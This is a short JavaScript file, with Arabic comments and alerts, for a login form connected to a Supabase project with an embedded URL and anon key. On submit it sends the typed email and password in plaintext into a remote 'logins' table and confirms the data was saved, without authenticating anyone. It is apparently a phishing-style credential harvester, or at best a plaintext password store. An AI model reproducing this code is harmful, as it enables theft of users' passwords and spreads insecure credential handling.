// script.js
import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

const supabaseUrl = 'https://ysietareuenlpqepiwdy.supabase.co'; // ← ضع هنا عنوان مشروعك من Supabase
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzaWV0YXJldWVubHBxZXBpd2R5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDUzMTUwMjUsImV4cCI6MjA2MDg5MTAyNX0.c7M5sEaw93n__MHEedAuVcVTyOZMTy8L2ivPXfEQjL0'; // ← ضع هنا الـ anon key من Supabase
const supabase = createClient(supabaseUrl, supabaseKey);

document.getElementById('loginForm').addEventListener('submit', async function (e) {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  const { data, error } = await supabase
    .from('logins')
    .insert([{ email, password }]);

  if (error) {
    alert('حدث خطأ أثناء حفظ البيانات');
    console.error(error);
  } else {
    alert('تم حفظ بياناتك بنجاح!');
    document.getElementById('loginForm').reset();
  }
});
